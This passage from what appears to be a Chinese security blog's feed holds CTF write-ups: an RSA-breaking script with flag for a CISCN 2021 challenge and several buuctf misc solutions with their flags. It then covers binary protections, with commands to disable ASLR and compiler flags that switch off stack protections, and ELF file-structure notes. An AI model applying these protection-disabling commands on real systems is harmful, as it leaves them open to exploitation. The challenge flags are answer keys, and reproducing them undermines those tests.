class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs 1c">import gmpy2<br>import libnum<br>from Crypto.Util.number import *<br><br><span class="hljs-meta">#低解密指数攻击</span><br>c1 = <span class="hljs-number">19105765285510667553313898813498220212421177527647187802549913914263968945493144633390670605116251064550364704789358830072133349108808799075021540479815182657667763617178044110939458834654922540704196330451979349353031578518479199454480458137984734402248011464467312753683234543319955893</span><br>e1 = <span class="hljs-number">3</span><br>N1 = <span class="hljs-number">123814470394550598363280518848914546938137731026777975885846733672494493975703069760053867471836249473290828799962586855892685902902050630018312939010564945676699712246249820341712155938398068732866646422826619477180434858148938235662092482058999079105450136181685141895955574548671667320167741641072330259009</span><br>i = <span class="hljs-number">0</span><br>while <span class="hljs-number">1</span>:<br>    if gmpy2.iroot(c1+i*N1, <span class="hljs-number">3</span>)[<span class="hljs-number">1</span>] == <span class="hljs-number">1</span>:<br>        print(hex(gmpy2.iroot(c1+i*N1, <span class="hljs-number">3</span>)[<span class="hljs-number">0</span>]))<br>        break<br>    i += <span class="hljs-number">1</span><br><br>c21 = <span class="hljs-number">54995751387258798791895413216172284653407054079765769704170763023830130981480272943338445245689293729308200574217959018462512790523622252479258419498858307898118907076773470253533344877959508766285730509067829684427375759345623701605997067135659404296663877453758701010726561824951602615501078818914410959610</span><br>c22 = <span class="hljs-number">91290935267458356541959327381220067466104890455391103989639822855753797805354139741959957951983943146108552762756444475545250343766798220348240377590112854890482375744876016191773471853704014735936608436210153669829454288199838827646402742554134017280213707222338496271289894681312606239512924842845268366950</span><br>e21 = <span class="hljs-number">17</span><br>e22 = <span class="hljs-number">65537</span><br>N2 = <span class="hljs-number">111381961169589927896512557754289420474877632607334685306667977794938824018345795836303161492076539375959731633270626091498843936401996648820451019811592594528673182109109991384472979198906744569181673282663323892346854520052840694924830064546269187849702880332522636682366270177489467478933966884097824069977</span><br><br><span class="hljs-meta">#共模攻击</span><br>def gongmogongji(n, c1, c2, e1, e2):<br>    def egcd(a, b):<br>        if b == <span class="hljs-number">0</span>:<br>            return a, <span class="hljs-number">0</span><br>        else:<br>            x, y = egcd(b, a % b)<br>            return y, x - (a <span class="hljs-comment">// b) * y</span><br>    s = egcd(e1, e2)<br>    s1 = s[<span class="hljs-number">0</span>]<br>    s2 = s[<span class="hljs-number">1</span>]<br><br>    <span class="hljs-meta"># 求模反元素</span><br>    if s1 &lt; <span class="hljs-number">0</span>:<br>        s1 = - s1<br>        c1 = gmpy2.invert(c1, n)<br>    elif s2 &lt; <span class="hljs-number">0</span>:<br>        s2 = - s2<br>        c2 = gmpy2.invert(c2, n)<br>    m = <span class="hljs-built_in">pow</span>(c1, s1, n) * <span class="hljs-built_in">pow</span>(c2, s2, n) % n<br>    return m<br>print(hex(gongmogongji(N2, c21, c22, e21, e22)))<br><br><span class="hljs-meta">#已知p高位</span><br>c3 = <span class="hljs-number">59213696442373765895948702611659756779813897653022080905635545636905434038306468935283962686059037461940227618715695875589055593696352594630107082714757036815875497138523738695066811985036315624927897081153190329636864005133757096991035607918106529151451834369442313673849563635248465014289409374291381429646</span><br>e3 = <span class="hljs-number">65537</span><br>N3 = <span class="hljs-number">113432930155033263769270712825121761080813952100666693606866355917116416984149165507231925180593860836255402950358327422447359200689537217528547623691586008952619063846801829802637448874451228957635707553980210685985215887107300416969549087293746310593988908287181025770739538992559714587375763131132963783147</span><br><br>&#x27;&#x27;&#x27;<br>n=<span class="hljs-number">11343293015503</span><span class="hljs-number">32637692707128</span><span class="hljs-number">25121761080813</span><span class="hljs-number">95210066669360</span><span class="hljs-number">68663559171164</span><span class="hljs-number">16984149165507</span><span class="hljs-number">23192518059386</span><span class="hljs-number">08362554029503</span><span class="hljs-number">58327422447359</span><span class="hljs-number">20068953721752</span><span class="hljs-number">85476236915860</span><span class="hljs-number">08952619063846</span><span class="hljs-number">80182980263744</span><span class="hljs-number">88744512289576</span><span class="hljs-number">35707553980210</span><span class="hljs-number">68598521588710</span><span class="hljs-number">73004169695490</span><span class="hljs-number">87293746310593</span><span class="hljs-number">98890828718102</span><span class="hljs-number">57707395389925</span><span class="hljs-number">59714587375763</span><span class="hljs-number">13113296378314</span>7<br>p=<span class="hljs-number">71172866959254</span><span class="hljs-number">72918001071846</span><span class="hljs-number">97390034264010</span><span class="hljs-number">77702148589281</span><span class="hljs-number">88419765628151</span><span class="hljs-number">47862023604288</span><span class="hljs-number">2657992902</span><br><br>pbits = 512<br>kbits = pbits-p.nbits()<br>p=p&lt;&lt;kbits<br>print(&quot;upper %d bits (of %d bits) is given&quot; % (pbits-kbits, pbits))<br>PR.&lt;x&gt; = PolynomialRing(Zmod(n))<br>f = x + p<br>x0 = f.small_roots(X=2^kbits, beta=0.4)[0]  # find root &lt; 2^kbits with factor &gt;= n^0.4<br>print(p+int(x0))<br>&#x27;&#x27;&#x27;<br>p = <span class="hljs-number">11437038763581010263116493983733546014403343859218003707512796706928880848035239990740428334091106443982769386517753703890002478698418549777553268906496423</span><br>q = N3 <span class="hljs-comment">// p</span><br>n = (p-<span class="hljs-number">1</span>) * (q-<span class="hljs-number">1</span>)<br>d = gmpy2.invert(e3, n)<br>m = <span class="hljs-built_in">pow</span>(c3,d,N3)<br>print(hex(m))<br></code></pre></td></tr></table></figure><p><img src="/2021/05/30/CISCN-2021-wp/image-20210516020425188.png" alt="image-20210516020425188"></p><p><img src="/2021/05/30/CISCN-2021-wp/image-20210516020227872.png" alt="image-20210516020227872"></p><p>CISCN{3943e8843a19149497956901e5d98639}</p>]]></content>
    
    
    <categories>
      
      <category>CTF赛题writeup</category>
      
    </categories>
    
    
    <tags>
      
      <tag>writeup</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>buuctf-misc-1</title>
    <link href="/2021/05/30/buuctf-misc-1/"/>
    <url>/2021/05/30/buuctf-misc-1/</url>
    
    <content type="html"><![CDATA[<h1 id="另外一个世界"><a href="#另外一个世界" class="headerlink" title="另外一个世界"></a>另外一个世界</h1><p>图片最后有一串2进制字符串。</p><p><a href="https://s1lenc3-chenmo.github.io/2021/05/17/buuctf-misc-1/image-20210517171713381.png"><img src="/2021/05/30/buuctf-misc-1/image-20210517171713381.png" alt="image-20210517171713381"></a></p><p>flag{koekj3s}</p><h1 id="隐藏的钥匙"><a href="#隐藏的钥匙" class="headerlink" title="隐藏的钥匙"></a>隐藏的钥匙</h1><p><img src="/2021/05/30/buuctf-misc-1/image-20210517172050595.png" alt="image-20210517172050595"></p><p>base64解码：</p><p>flag{377cbadda1eca2f2f73d36277781f00a}</p><h1 id="假如给我三天光明"><a href="#假如给我三天光明" class="headerlink" title="假如给我三天光明"></a>假如给我三天光明</h1><p>得到盲文，</p><p>kmdonowg</p><p>解压得到音频，发现莫斯密码。</p><p>-.-. - ..-. .– .–. . .. —– —.. –… …– ..— ..–.. ..— …– -.. –..</p><p>解密得到flag：flag{wpei08732?23dz}</p><h1 id="神秘龙卷风"><a href="#神秘龙卷风" class="headerlink" title="神秘龙卷风"></a>神秘龙卷风</h1><p>爆破，</p><p><img src="/2021/05/30/buuctf-misc-1/image-20210517173925348.png" alt="image-20210517173925348"></p><p>brainfuck解密。</p><p>flag{e4bbef8bdf9743f8bf5b727a9f6332a8}</p><h1 id="第四扩展FS"><a href="#第四扩展FS" class="headerlink" title="第四扩展FS"></a>第四扩展FS</h1><p>foremost分离出压缩包，文件属性中备注有密码，然后词频分析。</p><p><img src="/2021/05/30/buuctf-misc-1/image-20210517180546789.png" alt="image-20210517180546789"></p><p>flag{huanwe1sik4o!}</p><h1 id="shredder"><a href="#shredder" class="headerlink" title="shredder"></a>shredder</h1><h1 id="Sudoku"><a href="#Sudoku" class="headerlink" title="Sudoku"></a>Sudoku</h1><h1 id="42-tar-xz"><a href="#42-tar-xz" class="headerlink" title="42.tar.xz"></a>42.tar.xz</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">while</span> [ <span class="hljs-string">&quot;`find . -type f -name &#x27;*.tar.xz&#x27; | wc -l`&quot;</span> -gt 0 ]; <span class="hljs-keyword">do</span> find -<span class="hljs-built_in">type</span> f -name <span class="hljs-string">&quot;*.tar.xz&quot;</span> -<span class="hljs-built_in">exec</span> tar xf <span class="hljs-string">&#x27;&#123;&#125;&#x27;</span> \; -<span class="hljs-built_in">exec</span> rm -- <span class="hljs-string">&#x27;&#123;&#125;&#x27;</span> \;; <span class="hljs-keyword">done</span>;<br>find . -<span class="hljs-built_in">type</span> f -name <span class="hljs-string">&#x27;*.tar.xz&#x27;</span> | wc -l` <span class="hljs-comment">#找到.tar.xz结尾的所有文件,并统计显示文件个数</span><br><span class="hljs-keyword">while</span> 循环，&gt;=0 遍历文件<br>在shell脚本里<br>执行查找解压删除原压缩文件<br></code></pre></td></tr></table></figure><p>flag{04ebb0d6a87f9771f2eea4dce5b91a85e7623c13301a8007914085a91b3ca6d9}</p><h1 id="后门查杀"><a href="#后门查杀" class="headerlink" title="后门查杀"></a>后门查杀</h1><p><img src="/2021/05/30/buuctf-misc-1/image-20210518172104471.png" alt="image-20210518172104471"></p><p>flag{6ac45fb83b3bc355c024f5034b947dd3}</p><h1 id="荷兰宽带数据泄露"><a href="#荷兰宽带数据泄露" class="headerlink" title="荷兰宽带数据泄露"></a>荷兰宽带数据泄露</h1><p>路由器数据，使用RouterPassView打开</p><p>用户名为flag。</p><p><img src="/2021/05/30/buuctf-misc-1/image-20210518172835613.png" alt="image-20210518172835613"></p><p>flag{053700357621}</p><h1 id="来首歌吧"><a href="#来首歌吧" class="headerlink" title="来首歌吧"></a>来首歌吧</h1><p><img src="/2021/05/30/buuctf-misc-1/image-20210518173232085.png" alt="image-20210518173232085"></p><p>摩斯密码</p><p>flag{5BC925649CB0188F52E617D70929191C}</p><h1 id="数据包中的线索"><a href="#数据包中的线索" class="headerlink" title="数据包中的线索"></a>数据包中的线索</h1><p>筛选HTTP流，得到base64编码，进行解码，得到jpg文件，打开显示flag。</p><p>flag{209acebf6324a09671abc31c869de72c}</p><h1 id="九连环"><a href="#九连环" class="headerlink" title="九连环"></a>九连环</h1><p>伪加密，</p><p><img src="/2021/05/30/buuctf-misc-1/image-20210518180812630.png" alt="image-20210518180812630"></p><p>得到一张图片和一个压缩包，压缩包密码应该在图片中。</p><p>使用steghide extract -sf good.jpg 得到txt文件。</p><p>压缩包密码为bV1g6t5wZDJif^J7</p><p>flag{1RTo8w@&amp;4nK@z*XL}</p><h1 id="面具下的flag"><a href="#面具下的flag" class="headerlink" title="面具下的flag"></a>面具下的flag</h1>]]></content>
    
    
    <categories>
      
      <category>CTF赛题writeup</category>
      
      <category>misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>writeup</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>二进制程序的保护措施</title>
    <link href="/2020/04/11/%E4%BA%8C%E8%BF%9B%E5%88%B6%E7%A8%8B%E5%BA%8F%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%8E%AA%E6%96%BD/"/>
    <url>/2020/04/11/%E4%BA%8C%E8%BF%9B%E5%88%B6%E7%A8%8B%E5%BA%8F%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%8E%AA%E6%96%BD/</url>
    
    <content type="html"><![CDATA[<p>参考大佬博客：<a href="http://blog.eonew.cn/archives/222">http://blog.eonew.cn/archives/222</a></p><h1 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h1><p>ASLR（地址随机化）是一种针对缓冲区溢出的安全保护技术，通过对堆、栈、共享库映射等线性区布局的随机化，通过增加攻击者预测目的地址的难度，防止攻击者直接定位攻击代码位置，达到阻止溢出攻击的目的。<br>但是，地址随机化不是对所有模块和内存区都进行随机化！虽然libc、栈、堆的加载位置被随机化，但主镜像不会。</p><p>Linux检查是否开启ASLR，命令：</p><p><code>cat /proc/sys/kernel/randomize_va_space</code></p><p>如果/proc/sys/kernel/randomize_va_space里的值为0时，则表示ASLR关闭。</p><p>可用下面的命令手动关闭：</p><p><code>echo -n &quot;0&quot; &gt; /proc/sys/kernel/randomize_va_space</code>      -n表示不输出换行</p><p>Windows10强制开启ALSR，可以通过更改PE文件头里的Optional Header结构体里的DLL Characteristics字段，将DLL Characteristics字段的第7位设置为0即可关闭栈的ASLR，但是系统动态库的ALSR是强制开启的。</p><h1 id="DEP"><a href="#DEP" class="headerlink" title="DEP"></a>DEP</h1><p>数据执行保护，默认栈的权限是可读、可写、不可执行。</p><p>gcc编译时通过参数<code>-z execstack</code>关闭该保护，<code>-z noexecstack</code>开启该保护。（-z 传参链接器）</p><h1 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h1><p>PIE(position-independent executable, 地址无关可执行文件)技术就是一个针对代码段.text, 数据段.*data，.bss等固定地址的一个防护技术。同ASLR一样，应用了PIE的程序会在每次加载时都变换加载基址。</p><p>gcc编译时参数<code>-fpie -pie</code>开启PIE，-<code>no-pie</code>关闭PIE。</p><h1 id="Stack-Guard"><a href="#Stack-Guard" class="headerlink" title="Stack Guard"></a>Stack Guard</h1><p>编译器对栈溢出的一种保护机制，在函数执行时，先在栈上放置一个随机标识符，函数返回前会先检查标识符是否被修改，如果被修改则直接触发中断来中止程序，可以有效的防止栈溢出攻击。</p><p>gcc编译时传参<code>-fno-stack-protector</code> 就可以关闭 Stack Guard（CANARY）</p><h1 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h1><p>relro 是一种用于加强对 binary 数据段的保护的技术。relro 分为 partial relro 和 full relro。参数 -z norelro 是关闭RELRO保护。</p><p><strong>Partial RELRO</strong><br>现在gcc 默认编译就是 partial relro，参数是<code> -z relro</code><br>部分区块（比如：<code>.init_array .fini_array .jcr .dynamic .got</code>)在被动态装载（初始化）后，就被标记为只读区块。<br><strong>Full RELRO</strong><br>gcc编译参数是<code>-z relro -z now</code><br>拥有 Partial RELRO 的所有特性,所有导入的符号都在 startup time 被解析</p><h1 id="废话"><a href="#废话" class="headerlink" title="废话"></a>废话</h1><p>还有一些保护，因为太菜，还没遇到过，想了解，可直接传送至开头博客。</p>]]></content>
    
    
    <categories>
      
      <category>Pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux-ELF文件学习</title>
    <link href="/2020/04/01/Linux-%E6%96%87%E4%BB%B6/"/>
    <url>/2020/04/01/Linux-%E6%96%87%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<h1 id="目标文件"><a href="#目标文件" class="headerlink" title="目标文件"></a>目标文件</h1><p>先从目标文件说起，编译器编译源码之后的就是目标文件，目标文件除了没有链接库，格式和ELF相同。</p><p>目标文件中包括链接是所需的信息，如符号表、调试信息、字符串等。以“段”的形式存储。</p><p>机器指令通常放在代码段<code>.text</code>或<code>.code</code>。</p><p>初始化的全局变量和局部静态变量放在数据段<code>.data</code>。</p><p>未初始化的全局变量和局部静态变量放在数据段<code>.bss</code>。</p><p><code>gcc -c SimpleSection.c </code> gcc -c 是 只编译不链接，得到.o文件。</p><p><img src="/2020/04/01/Linux-%E6%96%87%E4%BB%B6/image-20200401225316230.png" alt="image-20200401225316230"></p><p><img src="/2020/04/01/Linux-%E6%96%87%E4%BB%B6/image-20200401230031389.png" alt="image-20200401230031389"></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-class">.rodata</span> <span class="hljs-comment">//只读数据段</span><br><span class="hljs-selector-class">.comment</span> <span class="hljs-comment">//注释信息段</span><br><span class="hljs-selector-class">.note</span><span class="hljs-selector-class">.GNU-stack</span> <span class="hljs-comment">//堆栈提示段</span><br></code></pre></td></tr></table></figure><p><img src="/2020/04/01/Linux-%E6%96%87%E4%BB%B6/image-20200401230420911.png" alt="image-20200401230420911"></p><p><code>dec 表示三个段长度之和的十进制，hex 是十六进制</code>。</p><h2 id="代码段"><a href="#代码段" class="headerlink" title="代码段"></a>代码段</h2><p><code>objdump -s -d SimpleSection.o</code></p><p>-s 以16进制打印段内容  -d 指令反汇编</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">SimpleSection</span>.o:     file format elf<span class="hljs-number">32</span>-i<span class="hljs-number">386</span><br><br><span class="hljs-attribute">Contents</span> of section .text:<br> <span class="hljs-attribute">0000</span> <span class="hljs-number">5589</span>e<span class="hljs-number">583</span> ec<span class="hljs-number">188</span>b<span class="hljs-number">45</span> <span class="hljs-number">08894424</span> <span class="hljs-number">04</span>c<span class="hljs-number">70424</span>  U......E..D$...$<br> <span class="hljs-attribute">0010</span> <span class="hljs-number">00000000</span> e<span class="hljs-number">8</span>fcffff ffc<span class="hljs-number">9</span>c<span class="hljs-number">355</span> <span class="hljs-number">89</span>e<span class="hljs-number">583</span>e<span class="hljs-number">4</span>  ...........U....<br> <span class="hljs-attribute">0020</span> f<span class="hljs-number">083</span>ec<span class="hljs-number">20</span> c<span class="hljs-number">7442418</span> <span class="hljs-number">01000000</span> <span class="hljs-number">8</span>b<span class="hljs-number">150400</span>  ... .D$.........<br> <span class="hljs-attribute">0030</span> <span class="hljs-number">0000</span>a<span class="hljs-number">100</span> <span class="hljs-number">00000001</span> d<span class="hljs-number">0034424</span> <span class="hljs-number">18034424</span>  ..........D$..D$<br> <span class="hljs-attribute">0040</span> <span class="hljs-number">1</span>c<span class="hljs-number">890424</span> e<span class="hljs-number">8</span>fcffff ff<span class="hljs-number">8</span>b<span class="hljs-number">4424</span> <span class="hljs-number">18</span>c<span class="hljs-number">9</span>c<span class="hljs-number">3</span>    ...$......D$... <br><span class="hljs-attribute">Contents</span> of section .data:<br> <span class="hljs-attribute">0000</span> <span class="hljs-number">54000000</span> <span class="hljs-number">55000000</span>                    T...U...        <br><span class="hljs-attribute">Contents</span> of section .rodata:<br> <span class="hljs-attribute">0000</span> <span class="hljs-number">25640</span>a<span class="hljs-number">00</span>                             %d..            <br><span class="hljs-attribute">Contents</span> of section .comment:<br> <span class="hljs-attribute">0000</span> <span class="hljs-number">00474343</span> <span class="hljs-number">3</span>a<span class="hljs-number">202855</span> <span class="hljs-number">62756</span>e<span class="hljs-number">74</span> <span class="hljs-number">752</span>f<span class="hljs-number">4</span>c<span class="hljs-number">69</span>  .GCC: (Ubuntu/Li<br> <span class="hljs-attribute">0010</span> <span class="hljs-number">6</span>e<span class="hljs-number">61726</span>f <span class="hljs-number">20342</span>e<span class="hljs-number">36</span> <span class="hljs-number">2</span>e<span class="hljs-number">332</span>d<span class="hljs-number">31</span> <span class="hljs-number">7562756</span>e  naro <span class="hljs-number">4</span>.<span class="hljs-number">6</span>.<span class="hljs-number">3</span>-<span class="hljs-number">1</span>ubun<br> <span class="hljs-attribute">0020</span> <span class="hljs-number">74753529</span> <span class="hljs-number">20342</span>e<span class="hljs-number">36</span> <span class="hljs-number">2</span>e<span class="hljs-number">3300</span>             tu<span class="hljs-number">5</span>) <span class="hljs-number">4</span>.<span class="hljs-number">6</span>.<span class="hljs-number">3</span>.     <br><span class="hljs-attribute">Contents</span> of section .eh_frame:<br> <span class="hljs-attribute">0000</span> <span class="hljs-number">14000000</span> <span class="hljs-number">00000000</span> <span class="hljs-number">017</span>a<span class="hljs-number">5200</span> <span class="hljs-number">017</span>c<span class="hljs-number">0801</span>  .........zR..|..<br> <span class="hljs-attribute">0010</span> <span class="hljs-number">1</span>b<span class="hljs-number">0</span>c<span class="hljs-number">0404</span> <span class="hljs-number">88010000</span> <span class="hljs-number">1</span>c<span class="hljs-number">000000</span> <span class="hljs-number">1</span>c<span class="hljs-number">000000</span>  ................<br> <span class="hljs-attribute">0020</span> <span class="hljs-number">00000000</span> <span class="hljs-number">1</span>b<span class="hljs-number">000000</span> <span class="hljs-number">00410</span>e<span class="hljs-number">08</span> <span class="hljs-number">8502420</span>d  .........A....B.<br> <span class="hljs-attribute">0030</span> <span class="hljs-number">0557</span>c<span class="hljs-number">50</span>c <span class="hljs-number">04040000</span> <span class="hljs-number">1</span>c<span class="hljs-number">000000</span> <span class="hljs-number">3</span>c<span class="hljs-number">000000</span>  .W..........&lt;...<br> <span class="hljs-attribute">0040</span> <span class="hljs-number">1</span>b<span class="hljs-number">000000</span> <span class="hljs-number">34000000</span> <span class="hljs-number">00410</span>e<span class="hljs-number">08</span> <span class="hljs-number">8502420</span>d  ....<span class="hljs-number">4</span>....A....B.<br> <span class="hljs-attribute">0050</span> <span class="hljs-number">0570</span>c<span class="hljs-number">50</span>c <span class="hljs-number">04040000</span>                    .p......        <br><br><span class="hljs-attribute">Disassembly</span> of section .text:<br><br><span class="hljs-attribute">00000000</span> &lt;func<span class="hljs-number">1</span>&gt;:<br>   <span class="hljs-attribute">0</span>:<span class="hljs-number">55</span>                   push   %ebp<br>   <span class="hljs-attribute">1</span>:<span class="hljs-number">89</span> e<span class="hljs-number">5</span>                mov    %esp,%ebp<br>   <span class="hljs-attribute">3</span>:<span class="hljs-number">83</span> ec <span class="hljs-number">18</span>             sub    $<span class="hljs-number">0</span>x<span class="hljs-number">18</span>,%esp<br>   <span class="hljs-attribute">6</span>:<span class="hljs-number">8</span>b <span class="hljs-number">45</span> <span class="hljs-number">08</span>             mov    <span class="hljs-number">0</span>x<span class="hljs-number">8</span>(%ebp),%eax<br>   <span class="hljs-attribute">9</span>:<span class="hljs-number">89</span> <span class="hljs-number">44</span> <span class="hljs-number">24</span> <span class="hljs-number">04</span>          mov    %eax,<span class="hljs-number">0</span>x<span class="hljs-number">4</span>(%esp)<br>   <span class="hljs-attribute">d</span>:c<span class="hljs-number">7</span> <span class="hljs-number">04</span> <span class="hljs-number">24</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> movl   $<span class="hljs-number">0</span>x<span class="hljs-number">0</span>,(%esp)<br>  <span class="hljs-attribute">14</span>:e<span class="hljs-number">8</span> fc ff ff ff       call   <span class="hljs-number">15</span> &lt;func<span class="hljs-number">1</span>+<span class="hljs-number">0</span>x<span class="hljs-number">15</span>&gt;<br>  <span class="hljs-attribute">19</span>:c<span class="hljs-number">9</span>                   leave  <br>  <span class="hljs-attribute">1a</span>:c<span class="hljs-number">3</span>                   ret    <br><br><span class="hljs-attribute">0000001b</span> &lt;main&gt;:<br>  <span class="hljs-attribute">1b</span>:<span class="hljs-number">55</span>                   push   %ebp<br>  <span class="hljs-attribute">1c</span>:<span class="hljs-number">89</span> e<span class="hljs-number">5</span>                mov    %esp,%ebp<br>  <span class="hljs-attribute">1e</span>:<span class="hljs-number">83</span> e<span class="hljs-number">4</span> f<span class="hljs-number">0</span>             and    $<span class="hljs-number">0</span>xfffffff<span class="hljs-number">0</span>,%esp<br>  <span class="hljs-attribute">21</span>:<span class="hljs-number">83</span> ec <span class="hljs-number">20</span>             sub    $<span class="hljs-number">0</span>x<span class="hljs-number">20</span>,%esp<br>  <span class="hljs-attribute">24</span>:c<span class="hljs-number">7</span> <span class="hljs-number">44</span> <span class="hljs-number">24</span> <span class="hljs-number">18</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> movl   $<span class="hljs-number">0</span>x<span class="hljs-number">1</span>,<span class="hljs-number">0</span>x<span class="hljs-number">18</span>(%esp)<br>  <span class="hljs-attribute">2b</span>:<span class="hljs-number">00</span> <br>  <span class="hljs-attribute">2c</span>:<span class="hljs-number">8</span>b <span class="hljs-number">15</span> <span class="hljs-number">04</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>    mov    <span class="hljs-number">0</span>x<span class="hljs-number">4</span>,%edx<br>  <span class="hljs-attribute">32</span>:a<span class="hljs-number">1</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    <span class="hljs-number">0</span>x<span class="hljs-number">0</span>,%eax<br>  <span class="hljs-attribute">37</span>:<span class="hljs-number">01</span> d<span class="hljs-number">0</span>                add    %edx,%eax<br>  <span class="hljs-attribute">39</span>:<span class="hljs-number">03</span> <span class="hljs-number">44</span> <span class="hljs-number">24</span> <span class="hljs-number">18</span>          add    <span class="hljs-number">0</span>x<span class="hljs-number">18</span>(%esp),%eax<br>  <span class="hljs-attribute">3d</span>:<span class="hljs-number">03</span> <span class="hljs-number">44</span> <span class="hljs-number">24</span> <span class="hljs-number">1</span>c          add    <span class="hljs-number">0</span>x<span class="hljs-number">1</span>c(%esp),%eax<br>  <span class="hljs-attribute">41</span>:<span class="hljs-number">89</span> <span class="hljs-number">04</span> <span class="hljs-number">24</span>             mov    %eax,(%esp)<br>  <span class="hljs-attribute">44</span>:e<span class="hljs-number">8</span> fc ff ff ff       call   <span class="hljs-number">45</span> &lt;main+<span class="hljs-number">0</span>x<span class="hljs-number">2</span>a&gt;<br>  <span class="hljs-attribute">49</span>:<span class="hljs-number">8</span>b <span class="hljs-number">44</span> <span class="hljs-number">24</span> <span class="hljs-number">18</span>          mov    <span class="hljs-number">0</span>x<span class="hljs-number">18</span>(%esp),%eax<br>  <span class="hljs-attribute">4d</span>:c<span class="hljs-number">9</span>                   leave  <br>  <span class="hljs-attribute">4e</span>:c<span class="hljs-number">3</span>                   ret    <br><br></code></pre></td></tr></table></figure><p>-x 可打印符号表</p><h2 id="其他段"><a href="#其他段" class="headerlink" title="其他段"></a>其他段</h2><p>各个段的功能说明。</p><p><img src="/2020/04/01/Linux-%E6%96%87%E4%BB%B6/image-20200402214117791.png" alt="image-20200402214117791"></p><p>objcopy可以将二进制文件、音频等文件作为目标文件的一个段。</p><p>自定义段 :<code>__attribute__((section(&quot;name&quot;)))</code>。</p><h1 id="ELF文件结构描述"><a href="#ELF文件结构描述" class="headerlink" title="ELF文件结构描述"></a>ELF文件结构描述</h1><p>ELF基本结构图：</p><p><img src="/2020/04/01/Linux-%E6%96%87%E4%BB%B6/image-20200402214917762.png" alt="image-20200402214917762"></p><p>ELF文件与段有关的重要结构是“段表”。</p><h2 id="文件头"><a href="#文件头" class="headerlink" title="文件头"></a>文件头</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">j1nx</span>@j<span class="hljs-number">1</span>nxu<span class="hljs-number">3</span>-pc:~/work$ readelf -h SimpleSection.o<br><span class="hljs-attribute">ELF</span> Header:<br>  <span class="hljs-attribute">Magic</span>:   <span class="hljs-number">7</span>f <span class="hljs-number">45</span> <span 